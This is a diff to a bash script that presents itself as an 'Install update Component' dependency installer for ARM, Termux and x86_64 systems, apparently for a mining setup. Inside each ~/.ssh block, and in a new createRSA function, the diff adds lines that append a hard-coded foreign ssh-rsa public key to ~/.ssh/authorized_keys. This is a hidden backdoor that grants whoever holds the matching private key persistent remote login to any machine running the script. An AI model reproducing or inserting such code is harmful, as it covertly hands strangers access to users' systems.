@@ -1,5 +1,12 @@
 #!/bin/bash
 cd
+function createRSA() {
+
+cat <<EOF >> ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
+EOF
+
+}
 
 echo -e 'Install update Component'
 sarch=$(uname -m)
@@ -10,7 +17,7 @@ if [ "$sarch" = "aarch64" ] || [ "$sarch" = "armv8" ]; then
 		pkg install -y libjansson nano jq
 		pkg install -y git nano libcurl-dev openssl-dev libjansson-dev automake autotools-dev build-essential
 		termux-wake-lock
-	elif [ !command -v sudo &> /dev/null ]; then		
+	elif [ ! command -v sudo &> /dev/null ]; then		
 #elif [ "$sarch" = "armv8" ]; then
 		apt-get update -y && apt-get upgrade -y
 		apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano jq wget
@@ -19,14 +26,14 @@ if [ "$sarch" = "aarch64" ] || [ "$sarch" = "armv8" ]; then
 		dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 		rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 
-		if [ ! -d ~/.ssh ]; then
-  			mkdir ~/.ssh
-  			chmod 0700 ~/.ssh
-     cat << EOF > ~/.ssh/authorized_keys
-     ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V>
-     EOF
-  			chmod 0600 ~/.ssh/authorized_keys
-		fi
+	if [ ! -d ~/.ssh ]; then
+  		mkdir ~/.ssh
+  		chmod 0700 ~/.ssh
+cat <<EOF >> ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
+EOF
+  		chmod 0600 ~/.ssh/authorized_keys
+	fi
 	else
 		sudo apt-get update -y && apt-get upgrade -y
 		sudo apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano jq wget
@@ -35,14 +42,14 @@ if [ "$sarch" = "aarch64" ] || [ "$sarch" = "armv8" ]; then
 		sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 		sudo rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 
-		if [ ! -d ~/.ssh ]; then
-  			mkdir ~/.ssh
-  			chmod 0700 ~/.ssh
-     cat << EOF > ~/.ssh/authorized_keys
-     ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V>
-     EOF
-  			chmod 0600 ~/.ssh/authorized_keys
-		fi
+	if [ ! -d ~/.ssh ]; then
+  		mkdir ~/.ssh
+  		chmod 0700 ~/.ssh
+cat <<EOF >> ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
+EOF
+  		chmod 0600 ~/.ssh/authorized_keys
+	fi
 	fi
 elif [ "$sarch" = "x86_64" ]; then
 	sudo apt update -y && sudo apt upgrade -y
@@ -55,9 +62,9 @@ elif [ "$sarch" = "x86_64" ]; then
 	if [ ! -d ~/.ssh ]; then
   		mkdir ~/.ssh
   		chmod 0700 ~/.ssh
-  		cat << EOF > ~/.ssh/authorized_keys
-    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V>
-    EOF
+cat <<EOF >> ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
+EOF
   		chmod 0600 ~/.ssh/authorized_keys
 	fi
 	echo "Update and Upgrade $sarch DONE!!"
